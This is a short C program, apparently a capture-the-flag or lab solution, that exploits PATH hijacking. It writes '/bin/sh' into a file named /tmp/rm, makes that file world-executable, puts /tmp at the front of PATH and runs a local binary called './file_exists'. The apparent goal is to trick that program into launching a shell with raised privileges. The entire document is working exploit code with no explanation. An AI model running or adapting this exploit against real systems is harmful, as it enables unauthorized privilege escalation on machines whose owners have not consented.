#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void main(int argc, char **argv) {
    FILE* f = fopen("/tmp/rm", "w");
    fprintf(f, "/bin/sh");
    fclose(f);
    system("chmod 777 /tmp/rm");
    char path[512] = "";
    sprintf(path, "%s%s", "PATH=/tmp:", getenv("PATH"));
    char* args[] = {"./file_exists", "file_exists", NULL};
    char* env[] = {path, NULL};
    execve("./file_exists", args, env);
}

